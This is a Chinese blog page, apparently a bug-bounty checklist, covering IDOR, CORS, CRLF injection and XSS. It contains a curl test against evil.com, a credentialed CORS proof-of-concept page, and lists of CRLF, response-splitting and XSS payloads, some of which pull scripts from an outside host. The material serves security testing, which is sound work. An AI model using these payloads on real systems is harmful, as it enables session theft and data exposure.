@@ -1,0 +1,1694 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Ethan">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Ethan">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="一花一世界，一木一森林">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>checklist整理~ · Ethan&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/ethan.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Ethan&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">checklist整理~</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Ethan's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            checklist整理~
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="SRC">SRC</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.5k</span>阅读时长: <span class="post-count reading-time">25 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/03</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>整理一个checklist用于渗透测试，持续待更。。。。。</p>
+<a id="more"></a>
+<h3 id="IDOR-不安全的直接对象引用"><a href="#IDOR-不安全的直接对象引用" class="headerlink" title="IDOR(不安全的直接对象引用)"></a>IDOR(<strong>不安全的直接对象引用</strong>)</h3><ul>
+<li>P1 - 账户接管，访问非常重要的数据（如信用卡）</li>
+<li>P2 - 更改/删除其他用户的公共数据，访问私人/公共重要数据（如门票，发票，付款信息）</li>
+<li>P3 - 访问/删除/更改私人数据（有限的个人信息：姓名，地址等）</li>
+<li>P4 - 访问任何不重要的数据</li>
+</ul>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>1.平行越权</p>
+<p>场景1：普通用户A可以访问到普通用户B的数据</p>
+<p>场景2：用户可以通过修改请求链接或参数，访问到其它本应无权访问的数据</p>
+<p>2.上下越权</p>
+<p>普通用户可以执行管理员的操作</p>
+<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p> A的ID改成B的ID然后进行请求查看是否可以越权获取到信息，或当ID的规律已知情况下基于Burp Intruder模块直接去遍历ID</p>
+<p>一些固定的 post 参数，如 hidden 属性的 input，或 ajax 的 data 中在页面返回时就确定的信息，都是可能被修改的</p>
+<ul>
+<li>获取 A 用户操作请求到的数据包，用B用户身份来请求，看返回数据</li>
+<li>用普通用户的帐号尝试访问管理员界面或者管理操作的 cgi</li>
+<li>修改请求链接中的业务 ID 等数据后，发起请求，判断是否有越权</li>
+<li>修改请求参数中的业务 ID，用户名等数据后，发起请求，判断是否有越权</li>
+</ul>
+<h4 id="使用Authz插件检测"><a href="#使用Authz插件检测" class="headerlink" title="使用Authz插件检测"></a>使用Authz插件检测</h4><p>使用插件检测的前提条件：<strong>同个业务系统中两个测试账号</strong></p>
+<p>作用：A账户用于功能的操作，B账户用于提供凭证（Cookie或者其他的用户身份凭证请求头）</p>
+<p><strong>举例说明：</strong></p>
+<p>一个业务系统，将A、B账户登入，同时获取B账户的Cookie或者其他的用户身份凭证请求头，填入到Authz的New Header里：</p>
+<p>参考：<a href="https://gh0st.cn/archives/2019-06-27/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2019-06-27/1</a></p>
+<h3 id="Cross-Origin-Resource-Sharing-CORS"><a href="#Cross-Origin-Resource-Sharing-CORS" class="headerlink" title="Cross Origin Resource Sharing (CORS)"></a><strong>Cross Origin Resource Sharing (CORS)</strong></h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源(协议 + 域名 + 端口)服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制</p>
+<p>由于配置不当，Origin源未严格，从而造成跨域问题。</p>
+<h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><p>Testing:<br><code>curl --head -s &#39;http://example.com/api/v1/secret&#39; -H &#39;Origin: http://evil.com&#39;</code></p>
+<p>查看服务器在<code>Access-Control-Allow-Origin：</code>（如果有的话）中响应了什么，如果有的话，检查是否存在<code>Access-Control-Allow-Credentials：true</code>。</p>
+<p>如果它信任任意来源<strong>并且</strong> allow-credentials设置为true，那么将此HTML作为概念证明。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>BugBounty CheatSheet<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>CORs POC<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">"10"</span> <span class="attr">cols</span>=<span class="string">"60"</span> <span class="attr">id</span>=<span class="string">"pwnz"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"cors()"</span>&gt;</span>Exploit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">  xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">"pwnz"</span>).innerHTML = <span class="keyword">this</span>.responseText;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="javascript">  xhttp.open(<span class="string">"GET"</span>, <span class="string">"http://example.com/api/v1/topsecret"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">  xhttp.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">  xhttp.send();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="CRLF-Injection-HTTP-Response-Splitting"><a href="#CRLF-Injection-HTTP-Response-Splitting" class="headerlink" title="CRLF Injection || HTTP Response Splitting"></a>CRLF Injection || HTTP Response Splitting</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>CRLF是Carriage-Return Line-Feed的缩写，意思是回车换行，就是回车(CR, ASCII 13, \r) 换行(LF, ASCII 10, \n)，CRLF字符（%0d%0a）CRLF也被称为HTML拆分</p>
+<p>CRLF注入漏洞的本质和XSS有点相似，攻击者将恶意数据发送给易受攻击的Web应用程序，Web应用程序将恶意数据<strong>输出在HTTP响应头</strong>中。（XSS一般输出在主体中）</p>
+<p>所以CRLF注入漏洞的检测也和XSS漏洞的检测差不多。通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出</p>
+<h4 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;</span><br></pre></td></tr></table></figure>
+<p><strong>基于请求头的测试，站点根目录</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0d%0aheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0aheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0dheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%23%0dheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3f%0dheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%250aheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%25250aheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%%0a0aheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%3f%0dheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%23%0dheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%25%30aheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%25%30%61header:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%u000aheader:header</span><br></pre></td></tr></table></figure>
+<p><strong>CRLF chained with Open Redirect server misconfiguration</strong></p>
+<p><em>Note:</em> This sometimes works. (Discovered in some Yandex sites, was not exploitable from the root.)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//www.google.com/%2f%2e%2e%0d%0aheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www.google.com/%2e%2e%2f%0d%0aheader:header</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/google.com/%2F..%0d%0aheader:header</span><br></pre></td></tr></table></figure>
+<p><strong>Twitter specific CRLF</strong> by <a href="http://blog.innerht.ml/twitter-crlf-injection/" target="_blank" rel="noopener">@filedescriptor</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%E5%98%8A%E5%98%8Dheader:header</span><br></pre></td></tr></table></figure>
+<p><strong>CRLF Injection to XSS</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2e%2e</span><br></pre></td></tr></table></figure>
+<p><strong>Response splitting on 302 Redirect, before Location header</strong> (Discovered in DoD)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert(&apos;XSS&apos;);%3C%2fscript%3E</span><br></pre></td></tr></table></figure>
+<p><strong>Response splitting on 301 code, chained with Open Redirect to corrupt location header and to break 301</strong> by <a href="https://twitter.com/black2fan" target="_blank" rel="noopener">@black2fan</a> (Facebook bug)</p>
+<p><em>Note:</em> <code>xxx:1</code> was used for breaking open redirect destination (Location header). Great example how of to escalate CRLF to XSS on a such, it would seem, unexploitable 301 status code.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr</span><br></pre></td></tr></table></figure>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">%0d%0a</span><br><span class="line">%0d%0a%0d%0a</span><br><span class="line">r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a&lt;html&gt;Injected%02Content&lt;/html&gt;</span><br><span class="line">%0d%0d%0a%0a</span><br><span class="line">0x0D0x0A</span><br><span class="line">0x0D0x0D0x0A0x0A</span><br><span class="line">\r\n</span><br><span class="line">%5cr%5cn</span><br><span class="line">%0%0d%0ad%0%0d%0aa</span><br><span class="line">%0%0D%0AD%0%0D%0AA</span><br><span class="line">%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4</span><br><span class="line">%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span><br><span class="line">%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span><br><span class="line">%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com</span><br><span class="line">%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E</span><br><span class="line">%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E</span><br><span class="line">%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22</span><br><span class="line">%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span><br><span class="line">%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E</span><br><span class="line">%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span><br></pre></td></tr></table></figure>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p><strong>Chrome XSS-Auditor Bypass</strong> by <a href="https://twitter.com/vivekchsm" target="_blank" rel="noopener">@vivekchsm</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">xlink:href</span>=<span class="string">#x</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">values</span>=<span class="string">&amp;#106;avascript:alert(1)</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">100</span> <span class="attr">height</span>=<span class="string">100</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Chrome &lt; v60 beta XSS-Auditor Bypass</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"data:,alert(1)%250A--&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>Other Chrome XSS-Auditor Bypasses</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)&lt;/script</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)%0d%0a--&gt;%09&lt;/script</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>%00%00%00%00%00%00%00<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Safari XSS Vector</strong> by <a href="https://twitter.com/mramydnei/status/902470271327551489" target="_blank" rel="noopener">@mramydnei</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href;<span class="string">'javascript:alert%281%29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
